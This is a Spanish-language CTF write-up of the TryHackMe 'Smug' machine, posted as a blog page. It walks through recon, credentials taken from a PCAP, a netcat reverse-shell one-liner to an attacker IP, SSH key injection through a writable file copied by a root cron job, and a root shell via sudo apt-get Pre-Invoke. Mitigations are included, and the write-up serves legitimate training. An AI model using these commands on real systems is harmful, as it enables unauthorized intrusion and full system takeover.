@@ -1,0 +1,284 @@
+<!DOCTYPE html>
+<!DOCTYPE html>
+
+<html lang="es">
+<head>
+<meta charset="utf-8"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title>Maquina Smug TryHackMe | ZsZsec</title>
+<meta content="Introduccion La máquina Smug representa un escenario clásico de seguridad ofensiva, donde múltiples fallos encadenados permiten que un atacante escale desde un acceso web básico ha..." name="description"/>
+<meta content="#000000" name="theme-color"/>
+<link href="../assets/favicon.svg" rel="icon" type="image/svg+xml"/>
+<link href="../assets/style.css" rel="stylesheet"/>
+</head>
+<body>
+<div class="scanline"></div>
+<header class="site-header">
+<a aria-label="Inicio" class="brand" href="../index.html"><span class="brand-mark">λ</span><span class="brand-text">ZsZsec</span></a>
+<nav aria-label="Navegación principal" class="nav"><a class="nav-link" href="../index.html">Inicio</a><a class="nav-link" href="../sobre-mi.html">Sobre mí</a><a class="nav-link" href="../articulos.html">Artículos</a><a class="nav-link active" href="../writeups.html">Writeups</a></nav>
+</header>
+<main>
+<section class="page-hero compact">
+<p class="eyebrow">TryHackMe</p>
+<h1>Maquina Smug TryHackMe<span>_</span></h1>
+<div class="writeup-meta"><span>Nmap / feroxbuster / wireshark</span></div>
+<div class="tag-row"><span class="tag">Nmap</span><span class="tag">feroxbuster</span><span class="tag">wireshark</span><span class="tag">Escalada_Privilegios</span><span class="tag">apt-get</span><span class="tag">ssh-keygen</span><span class="tag">Data_Exfiltration_HTTP</span><span class="tag">Shell</span></div>
+</section>
+<section class="content-shell">
+<article class="markdown-body">
+<h1>Introduccion</h1>
+<p>La máquina <strong>Smug</strong> representa un escenario clásico de seguridad ofensiva, donde múltiples fallos encadenados permiten que un atacante escale desde un acceso web básico hasta el control total del sistema. El recorrido inicia con el descubrimiento de un servicio web aparentemente inocente, pero que contenía información sensible expuesta en un archivo de captura de tráfico. Dicho archivo reveló credenciales en texto claro y un dominio interno de desarrollo que abrió la puerta a un panel vulnerable con ejecución remota de comandos.</p>
+<p>A partir de esa brecha inicial, se logró obtener una shell como el usuario de servicio <code>www-data</code>. Sin embargo, la verdadera complejidad y aprendizaje de esta máquina radican en las <strong>dos escaladas de privilegios</strong>: la primera, explotando un cronjob mal configurado que permitía inyectar claves públicas en la cuenta de <code>jake</code>; y la segunda, abusando de permisos sudo demasiado permisivos sobre <code>apt-get</code>, lo que derivó en una shell como root.</p>
+<h1>Reconocimiento</h1>
+<p>Se realizó un escaneo amplio para detectar servicios expuestos:</p>
+<pre><code class="language-bash">──(zikuta㉿zikuta)-[~/Desktop/smag]
+└─$ nmap -sV -sS -Pn -p- -sC --min-rate 5000 10.201.98.211 -oN nmap.tx 
+Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-31 22:27 CDT
+Nmap scan report for 10.201.98.211
+Host is up (0.25s latency).
+Not shown: 65533 closed tcp ports (reset)
+PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 74:e0:e1:b4:05:85:6a:15:68:7e:16:da:f2:c7:6b:ee (RSA)
+|   256 bd:43:62:b9:a1:86:51:36:f8:c7:df:f9:0f:63:8f:a3 (ECDSA)
+|_  256 f9:e7:da:07:8f:10:af:97:0b:32:87:c9:32:d7:1b:76 (ED25519)
+80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
+|_http-title: Smag
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+</code></pre>
+<p><strong>Hallazgos principales:</strong></p>
+<ul>
+<li><strong>22/tcp (SSH)</strong> — OpenSSH 7.2p2 (Ubuntu).</li>
+<li><strong>80/tcp (HTTP)</strong> — Apache 2.4.18 (Ubuntu).</li>
+</ul>
+<p>Esto indica una típica superficie web con acceso remoto por SSH, lo que sugiere que la intrusión probablemente progresará a través de la aplicación web.</p>
+<h3>Fuerza bruta de directorios</h3>
+<p>Contra el puerto 80, se ejecutó <strong>feroxbuster</strong> para enumerar rutas interesantes:</p>
+<pre><code class="language-bash">─(zikuta㉿zikuta)-[~/Desktop/smag]
+└─$ feroxbuster -u http://10.201.98.211 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt 
+                                                                                                                                                                                             
+ ___  ___  __   __     __      __         __   ___
+|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
+|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
+by Ben "epi" Risher 🤓                 ver: 2.11.0
+───────────────────────────┬──────────────────────
+ 🎯  Target Url            │ http://10.201.98.211
+ 🚀  Threads               │ 50
+ 📖  Wordlist              │ /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
+ 👌  Status Codes          │ All Status Codes!
+ 💥  Timeout (secs)        │ 7
+ 🦡  User-Agent            │ feroxbuster/2.11.0
+ 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
+ 🔎  Extract Links         │ true
+ 🏁  HTTP methods          │ [GET]
+ 🔃  Recursion Depth       │ 4
+───────────────────────────┴──────────────────────
+ 🏁  Press [ENTER] to use the Scan Management Menu™
+──────────────────────────────────────────────────
+404      GET        9l       31w      275c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+403      GET        9l       28w      278c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
+301      GET        9l       28w      313c http://10.201.98.211/mail =&gt; http://10.201.98.211/mail/
+200      GET       13l     3455w   141841c http://10.201.98.211/mate
+</code></pre>
+<p><strong>Rutas relevantes:</strong></p>
+<ul>
+<li><code>/mail/</code> (redirección 301; contenido interesante dentro).</li>
+<li><code>/mate</code> (200 OK; tamaño grande).</li>
+</ul>
+<h2>Análisis del tráfico (PCAP) y descubrimiento del dominio</h2>
+<p>El directorio <strong>/mail/</strong> contenía <strong>conversaciones entre desarrolladores</strong> y un <strong>archivo .pcap</strong>. El .pcap fue la clave para conseguir credenciales en texto claro.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/fe1fae5b-a388-4251-b45e-ebfe277b042c"/></p>
+<p>Al revisar la captura <strong>PCAP</strong> (posible intercepción de tráfico HTTP sin cifrar), aparecieron credenciales en <strong>texto plano</strong>:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/2d344330-d3c4-4bfa-93b4-964f7f3aef00"/></p>
+<pre><code>username: helpdesk
+password: cH4nG3M3_n0w</code></pre>
+<p>Además, en los encabezados/flujo HTTP se observó un <strong>dominio interno</strong>: <code>development.smag.thm</code>. Para poder resolverlo desde mi equipo, añadí la entrada en <code>/etc/hosts</code>:</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/e3105ab3-f3ca-4f6a-ab7f-6a803cb7dc39"/></p>
+<p>Con eso, pude acceder a <code>http://development.smag.thm/</code> y llegar a un <strong>panel de login</strong> (<code>login.php</code> / <code>admin.php</code>), donde funcionaron correctamente las credenciales extraídas del PCAP. <strong>Conclusión</strong>: el equipo filtró credenciales a través de tráfico HTTP sin TLS, y el dominio de desarrollo estaba expuesto y resolvible localmente.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/872d2efd-5d49-4a1c-aa2f-87e6e87dca3f"/></p>
+<h2>Ejecución remota de comandos (RCE) y shell inversa</h2>
+<p>Tras iniciar sesión como <strong>helpdesk</strong>, la aplicación ofrecía una funcionalidad para <strong>ejecutar comandos en el servidor</strong> (un caso clásico de RCE). Para obtener una shell interactiva en mi máquina, utilicé un <strong>one-liner</strong> de <strong>reverse shell</strong> que invoca <code>/bin/sh</code> y redirige E/S a través de <strong>netcat</strong>:</p>
+<pre><code class="language-bash">rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|sh -i 2&gt;&amp;1|nc 10.23.120.245 4444 &gt;/tmp/f
+</code></pre>
+<p><strong>Qué hace este one-liner</strong></p>
+<ul>
+<li>Crea un FIFO (<code>/tmp/f</code>) para encadenar entrada/salida.</li>
+<li>Ejecuta <code>sh -i</code> (shell interactiva) y canaliza su E/S hacia <code>nc</code>.</li>
+<li><code>nc</code> se conecta a tu <strong>listener</strong> (<code>10.23.120.245:4444</code>) y te entrega una shell como el usuario del proceso web (típicamente <code>www-data</code>).</li>
+</ul>
+<p>y lo ejecutamos.</p>
+<p><img alt="Image" src="https://github.com/user-attachments/assets/1d62f819-9182-409d-b16a-c29bc6de13bc"/></p>
+<p>y listo!!! en nuestra maquina recibiremos una shell</p>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~/Desktop/smag]
+└─$ nc -lvnp 4444 
+listening on [any] 4444 ...
+^[connect to [10.23.120.245] from (UNKNOWN) [10.201.98.211] 44892
+sh: 0: can't access tty; job control turned off
+$ 
+</code></pre>
+<p>Al recibir la conexión, obtuve una shell con permisos de <strong><code>www-data</code></strong>, lo que confirma que la función de ejecución de comandos no estaba filtrando adecuadamente.</p>
+<p><strong>Tip (opcional):</strong> estabiliza la TTY:</p>
+<pre><code class="language-bash">python -c 'import pty; pty.spawn("/bin/bash")'
+export TERM=xterm-256color
+stty rows 50 columns 120
+</code></pre>
+<h1>Escalada de privilegios I — de <code>www-data</code> a <code>jake</code> mediante <strong>cron</strong></h1>
+<h3>4.1. Enumeración de cronjobs</h3>
+<p>En la máquina comprometida, revisé tareas programadas:</p>
+<pre><code class="language-bash">cat /etc/crontab
+# /etc/crontab: system-wide crontab
+# Unlike any other crontab you don't have to run the `crontab'
+# command to install the new version when you edit this file
+# and files in /etc/cron.d. These files also have username fields,
+# that none of the other crontabs do.
+
+SHELL=/bin/sh
+PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin
+
+# m h dom mon dow user  command
+17 *    * * *   root    cd / &amp;&amp; run-parts --report /etc/cron.hourly
+25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.daily )
+47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.weekly )
+52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / &amp;&amp; run-parts --report /etc/cron.monthly )
+*  *    * * *   root    /bin/cat /opt/.backups/jake_id_rsa.pub.backup &gt; /home/jake/.ssh/authorized_keys
+</code></pre>
+<p>Aquí se observa que <strong>cada minuto</strong> el usuario <code>root</code> ejecuta un comando que copia el archivo <code>/opt/.backups/jake_id_rsa.pub.backup</code> dentro de <code>/home/jake/.ssh/authorized_keys</code>.</p>
+<p>Esto significa que, si logro <strong>modificar el archivo de backup</strong>, puedo inyectar mi propia clave pública SSH para acceder como el usuario <code>jake</code>.</p>
+<p><strong>Interpretación:</strong> cada minuto, <strong>root</strong> copia (con <code>cat</code>) el contenido de <code>/opt/.backups/jake_id_rsa.pub.backup</code> hacia <code>/home/jake/.ssh/authorized_keys</code>.</p>
+<p><strong>Riesgo:</strong> si <strong>yo</strong> puedo <strong>escribir</strong> en ese archivo de backup, entonces puedo <strong>inyectar mi clave pública SSH</strong>, y el propio cron me la instalará como autorizada para el usuario <strong>jake</strong>. Resultado: <strong>acceso SSH como <code>jake</code> sin contraseña</strong>.</p>
+<h4>Generación de clave SSH</h4>
+<p>En mi máquina atacante generé un par de claves RSA para poder conectarme vía SSH sin contraseña:</p>
+<pre><code class="language-bash">┌──(zikuta㉿zikuta)-[~/Desktop/smag]
+└─$ ssh-keygen -t rsa -b 4096 -f mykey
+</code></pre>
+<p>Esto produjo los archivos:</p>
+<ul>
+<li><code>mykey</code> → clave privada.</li>
+<li><code>mykey.pub</code> → clave pública.</li>
+</ul>
+<h3>Inyección de clave púbica en el backup</h3>
+<p>Ya dentro de la máquina víctima con <code>www-data</code>, sobrescribí el archivo usado por el cronjob con mi clave pública:</p>
+<pre><code class="language-bash">www-data@smag:/var/www/development.smag.thm$ echo "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAACAQDBMzWZrmrKnZUssefkNzd41sWf51cgcFyynkNGoou5bKTR562Jx6eXAv+RzD2XOV8s6I0CNxE4sHAsPmp3a9MtL52jWcdlz+4IQhEj5DqktVt/t0LL6f3MSAZhpMdwBIBN3lzr7mH4Y1uGaM5I/Yec2/ga3cu/c/f61JeZeQq7zVYQ+0fxJTmPOza4NOYyYJIDErcMKKgIgUXc5XfwTaNuKg851t2bA6Pum/CTv3kut4Mu9D6GcuzImDdl8nciCB6TRte5CJciRmq7x6IxN96qPx8sya5Iqk6pGB8iWtQ8RPIF4wQnhxUvlK2ZFMFakVz8isqjNOw4UpwpxVN+z43qRIR63NMgNrjWkABlrFuC2EZkoLtA44jmeBH4Xk4R+uX5wgn3hCw== zikuta@zikuta" &gt; /opt/.backups/jake_id_rsa.pub.backup
+</code></pre>
+<p>Cuando el cronjob corrió (cada minuto), el contenido de ese backup pasó a ser el <code>authorized_keys</code> de <strong>jake</strong>. En segundos, ya era posible autenticarse como <strong>jake</strong> usando <strong>mi clave privada</strong>:</p>
+<p><strong>Por qué funciona</strong></p>
+<ul>
+<li>El <strong>cron</strong> corre como <strong>root</strong>, por lo que ignora permisos intermedios.</li>
+<li>Si el archivo de <strong>origen</strong> es <strong>escribible</strong> por un atacante, la tarea privilegiada <strong>propaga</strong> esa modificación a un archivo crítico (<code>authorized_keys</code>) dentro del <code>$HOME</code> del usuario objetivo.</li>
+<li>Efecto neto: <strong>confianza transferida</strong> desde root hacia el contenido que yo controlo, habilitando <strong>acceso persistente</strong> como el usuario <strong>jake</strong>.</li>
+</ul>
+<p><strong>Mitigación recomendada:</strong></p>
+<ul>
+<li>El directorio <code>/opt/.backups/</code> y sus archivos deben ser <strong>propiedad de root</strong> y <strong>no escribibles</strong> por otros (modo <code>0644</code> como máximo, y directorio <code>0755</code> o más restrictivo).</li>
+<li>Usar <code>install</code> o <code>cp --preserve=mode,ownership</code> y <strong>verificar propietarios/permisos</strong> antes de sustituir <code>authorized_keys</code>.</li>
+<li>Idealmente, que el cronjob <strong>no lea archivos ubicados en rutas donde “www-data” u otros usuarios puedan escribir</strong></li>
+</ul>
+<h3>Escalada de privilegios II — de <code>jake</code> a <strong>root</strong> con <code>sudo apt-get</code></h3>
+<p>Tras esperar unos segundos, intenté conectarme como el usuario <code>jake</code> usando mi clave privada:</p>
+<pre><code class="language-bash">(zikuta㉿zikuta)-[~/Desktop/smag]
+└─$ ssh -i mykey jake@10.201.67.177
+
+The authenticity of host '10.201.67.177 (10.201.67.177)' can't be established.
+ED25519 key fingerprint is SHA256:N0hcdtAhlytMwu8PGLVD+c0ZKcV7TMNWnOr0wVw0Wp8.
+This host key is known by the following other names/addresses:
+    ~/.ssh/known_hosts:67: [hashed name]
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.201.67.177' (ED25519) to the list of known hosts.
+Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-142-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+Last login: Fri Jun  5 10:15:15 2020
+jake@smag:~$ 
+</code></pre>
+<p>¡Y funcionó! Logré acceso directo a la máquina como <code>jake</code></p>
+<p>El <strong>mal diseño del cronjob</strong> permitió que cualquier usuario con acceso de escritura al archivo <code>/opt/.backups/jake_id_rsa.pub.backup</code> pudiera inyectar sus propias claves SSH.<br/>
+Esto resultó en un <strong>Privilege Escalation de <code>www-data</code> → <code>jake</code></strong>, ya que cada minuto el proceso ejecutado por <code>root</code> actualizaba las claves autorizadas del usuario <code>jake</code>.</p>
+<h2>Escalada de privilegios II — de <code>jake</code> a <strong>root</strong> con <code>sudo apt-get</code></h2>
+<p>Despues de leer la <code>user flag</code> procedi a hacer un <code>sudo -l</code> para ver que comandos podia ejecutar como root sin serlo y encontre esta maravilla...</p>
+<pre><code class="language-bash">jake@smag:~$ sudo -l
+Matching Defaults entries for jake on smag:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User jake may run the following commands on smag:
+    (ALL : ALL) NOPASSWD: /usr/bin/apt-get
+</code></pre>
+<p>Esto significa que <code>jake</code> puede ejecutar <strong><code>/usr/bin/apt-get</code></strong> como root <strong>sin contraseña</strong> y <strong>sin restricciones adicionales</strong>. Aunque <code>apt-get</code> es un gestor de paquetes, incorpora <strong>ganchos</strong> y <strong>opciones</strong> que permiten <strong>ejecutar comandos arbitrarios</strong> durante fases de <code>update</code>, <code>install</code>, etc. Si el binario puede invocarse con privilegios, se convierte en un vector directo de <strong>privesc</strong>.</p>
+<h3>¿Por qué es peligroso <code>apt-get</code>?</h3>
+<p>El programa <code>apt-get</code> (gestor de paquetes en sistemas Debian/Ubuntu) tiene opciones que permiten ejecutar <strong>scripts o comandos personalizados</strong> durante las operaciones de instalación/actualización.</p>
+<p>En condiciones normales eso no es un problema, pero si un usuario sin privilegios puede invocar <code>apt-get</code> como root sin restricciones, se convierte en una vía directa para ejecutar comandos arbitrarios como <strong>root</strong>.</p>
+<p>Este vector de ataque está documentado en <strong>GTFOBins</strong> (repositorio de técnicas de abuso de binarios comunes).</p>
+<h3>Payload para obtener una shell root</h3>
+<p>Según GTFOBins, uno de los métodos más sencillos es abusar de la opción <code>APT::Update::Pre-Invoke</code>. Esta directiva le dice a <code>apt-get</code> que ejecute un comando <strong>antes de realizar la actualización de paquetes</strong>.</p>
+<p>De esta manera, podemos forzar la ejecución de <code>/bin/sh</code> con privilegios de root:</p>
+<pre><code class="language-bash">jake@smag:~$ sudo apt-get update -o APT::Update::Pre-Invoke::=/bin/sh
+# 
+# id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<h3>Escalada exitosa</h3>
+<p>Al ejecutar el comando, inmediatamente obtuve una shell como <strong>root</strong>:</p>
+<pre><code class="language-bash"># id
+uid=0(root) gid=0(root) groups=0(root)
+</code></pre>
+<p>Ya tenía el control total de la máquina, pudiendo leer cualquier archivo y manipular el sistema sin restricciones.</p>
+<p>El fallo se debió a una <strong>configuración insegura de sudo</strong> que permitía a <code>jake</code> ejecutar <code>apt-get</code> como root.<br/>
+Dado que <code>apt-get</code> puede invocar comandos arbitrarios durante su ejecución, se explotó con la opción <code>APT::Update::Pre-Invoke</code> para obtener una shell root.</p>
+<p><strong>Mitigación recomendada:</strong></p>
+<ul>
+<li><strong>Eliminar</strong> <code>NOPASSWD</code> para <code>apt-get</code> en <code>sudoers</code>.</li>
+<li>Restringir el uso de <code>sudo</code> a utilidades <strong>realmente necesarias</strong> y preferir <strong>wrappers</strong> limitados.</li>
+<li>Implementar <em>policy kits</em>, <em>allowlists</em> y <strong>auditorías</strong> de configuración.</li>
+<li>Monitorear uso de <code>sudo</code> y cambios en paquetes/apt logs.</li>
+</ul>
+<h2>Cierre</h2>
+<p>La intrusión se cimentó en tres fallos encadenados: <strong>credenciales expuestas</strong>, <strong>RCE en el panel de desarrollo</strong> y dos <strong>configuraciones inseguras</strong> a nivel de sistema (<strong>cron</strong> y <strong>sudo</strong>). Documenté cada paso con el <strong>porqué</strong> técnico detrás y cómo <strong>mitigarlo</strong>. Con esto, deberías poder pegar el texto en tu documento y tener una narrativa clara, coherente y con foco en las dos escaladas de privilegios</p>
+<h3>Cadena de escalada de privilegios</h3>
+<table>
+<thead>
+<tr>
+<th><strong>Etapa</strong></th>
+<th><strong>Descripción</strong></th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Reconocimiento</td>
+<td>Escaneo con Nmap y feroxbuster → descubrimiento de <code>/mail/</code>.</td>
+</tr>
+<tr>
+<td>Exfiltración</td>
+<td>Archivo PCAP en <code>/mail/</code> con credenciales (<code>helpdesk:cH4nG3M3_n0w</code>) y dominio <code>development.smag.thm</code>.</td>
+</tr>
+<tr>
+<td>Acceso inicial</td>
+<td>Login en <code>development.smag.thm</code> → panel con ejecución de comandos (RCE).</td>
+</tr>
+<tr>
+<td>Shell inversa</td>
+<td>Payload con netcat → acceso como usuario <code>www-data</code>.</td>
+</tr>
+<tr>
+<td>Escalada I</td>
+<td>Cronjob de root copia archivo escribible a <code>~jake/.ssh/authorized_keys</code> → acceso SSH como <code>jake</code>.</td>
+</tr>
+<tr>
+<td>Escalada II</td>
+<td><code>sudo -l</code> revela <code>NOPASSWD</code> en <code>/usr/bin/apt-get</code> → shell root con <code>APT::Update::Pre-Invoke</code>.</td>
+</tr>
+<tr>
+<td>Compromiso total</td>
+<td>Obtención de privilegios root y acceso a <code>root.txt</code>.</td>
+</tr>
+</tbody>
+</table>
+</article>
+</section>
+</main>
+<footer class="site-footer"><span>ZsZsec // Zikuta</span><span class="footer-dot">•</span><span>Offensive Security Notes</span></footer>
+</body>
+</html>
